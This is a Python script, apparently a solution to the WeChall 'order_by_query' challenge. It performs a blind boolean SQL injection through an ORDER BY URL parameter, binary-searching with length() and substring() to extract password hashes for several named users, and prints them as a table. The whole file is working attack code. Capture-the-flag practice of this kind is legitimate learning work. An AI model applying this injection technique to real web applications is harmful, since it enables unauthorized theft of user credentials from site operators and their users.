#!/usr/bin/env python3
# -*- encoding=utf-8 -*-
'''
This script can exploit multi-user, just change who u want to exploit. BTW, this script can be used directly without providing any cookies, enjoy!
'''
import requests

url_template = 'http://www.wechall.net/challenge/order_by_query/index.php?by=5,%%20if((select%%20%s(password%s)%%3C%%3D%s%%20from%%20users%%20where%%20username%%3D0x%s),%%20username,%%20bananas)--%%20&dir=DESC'
true_text = '<td align="right">14</td><td>Admin</td>'
# changed here to exploit other users
to_exploit = ['Horst4', 'Horst5', 'Peter2', 'Peter3', 'Peter4', 'Peter5']

result = {}
for name in to_exploit:
    hex_name = bytes(name, encoding='utf-8').hex()
    print("[*] Start guessing %s's password..." % name)
    begin, end = 1, 50
	# Use dichotomy algorithm to guess length
	# However, all passwords are MD5 encoded, so the length must be 32 bytes, so u can just skip this guess function
    while begin < end:
        middle = (end + begin) // 2
        guess_length = url_template % ('length', '', hex(middle), hex_name)
        res = requests.get(guess_length)
        if true_text in res.text:
            # Get true result
            end = middle
        else:
            begin = middle + 1
    print("[+] %s's password length is %d" % (name, end))

    password = ''
    percent = end // 4
    count = 1
    for i in range(1, end + 1):
        if i == percent * count:
            print("[+] Guessing progress at %d%%... " % (count * 25))
            count += 1
        begin_char = 20
        end_char = 126
		# Still use dichotomy algorithm to exploit. 
	    # Also because the password are composed of only uppercase letter and number, which means u can narrow the guess range to be more effective.
        while begin_char < end_char:
            middle = (begin_char + end_char) // 2
            guess_char = url_template % (
                'substring', ',%d,1' % i, hex(middle), hex_name)
            res = requests.get(guess_char)
            if true_text in res.text:
                end_char = middle
            else:
                begin_char = middle + 1
        res = chr(end_char)
        password += res
    print('[*] %s\'s password is %s' % (name, password))
    result[name] = password

# Output with beautiful format :-)
print('The results is:')
print('|-' + '-' * 12 + '|-' + '-' * 32 + '-|')
print('| ' + 'Username' + ' ' * 4 + '| ' + 'Password' + ' ' * 24 + ' |')
print('|-' + '-' * 12 + '|-' + '-' * 32 + '-|')
for name in to_exploit:
    print('| ' + '%-12s' % name + '| ' + '%-32s' % result[name] + ' |')
    print('|-' + '-' * 12 + '|-' + '-' * 32 + '-|')

